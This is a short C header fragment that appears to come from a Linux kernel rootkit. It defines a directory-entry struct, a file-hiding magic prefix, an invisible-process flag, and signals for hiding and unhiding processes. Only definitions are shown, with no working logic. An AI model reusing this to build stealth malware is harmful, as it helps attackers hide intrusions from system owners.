struct linux_dirent {
        unsigned long   d_ino;
        unsigned long   d_off;
        unsigned short  d_reclen;
        char            d_name[1];
};
#define START_MEM	PAGE_OFFSET
#define END_MEM		ULONG_MAX

#define MAGIC_PREFIX "chrome"
#define PF_INVISIBLE 0x10000000

#define LOADAVG "loadavg"
#define STAT "stat"

enum {
	SIGINVIS = 31,
        SIGVIS = 32,
};

#ifndef IS_ENABLED
#define IS_ENABLED(option) \
(defined(__enabled_ ## option) || defined(__enabled_ ## option ## _MODULE))
#endif
